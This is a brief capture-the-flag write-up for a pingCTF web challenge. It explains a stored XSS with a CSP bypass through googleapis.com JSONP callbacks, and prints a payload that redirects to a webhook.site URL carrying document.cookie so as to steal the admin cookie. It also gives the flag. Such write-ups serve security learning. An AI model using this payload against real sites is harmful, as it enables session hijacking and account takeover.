# Solution

- Flag is stored in the keyboards table. We can query a keyboard with `/keyboard/<id>`
- We cannot view the flag keyboard without the admin cookie
- `agent.approve_keyboard()` is used in `submit_keyboard()` and `app.approve_keyboard()`
- There is an XSS in the submit description field, but CSP is blocking us.
`*.googleapis.com` is allowed in script-src so you can use one of the domains and jsonp callbacks to get JS execution
- `connect-src: self` is blocking HTTP requests when exfiltrating cookies. You can bypass this using a redirect with `window.location`
- Once you have the admin cookie, view the flag keyboard http://116.202.98.159:31790/keyboard/4

```
<script src="https://www.googleapis.com/customsearch/v1?callback=(function(){window.top.location.href=`https://webhook.site/887722a2-39e8-4ac2-869e-64489b72347d/${document.cookie}`})()"></script>
```

Flag: `pingCTF{1_0n1y_u53_4_m0u53_4nyw4y}`

Solved by: yappare